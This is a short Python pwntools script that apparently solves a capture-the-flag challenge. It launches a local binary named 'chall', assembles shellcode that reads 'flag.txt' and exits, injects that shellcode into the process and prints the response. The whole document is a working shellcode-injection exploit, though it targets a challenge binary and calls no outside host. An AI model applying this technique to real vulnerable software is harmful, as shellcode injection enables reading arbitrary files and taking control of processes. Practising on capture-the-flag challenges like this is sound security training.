from pwn import *


io = process('./chall')

f = 'flag.txt'

shellcode = asm(
        shellcraft.cat(f) + 
        shellcraft.exit(0))


print(io.recvline())
io.sendline(shellcode)
print(io.recv())
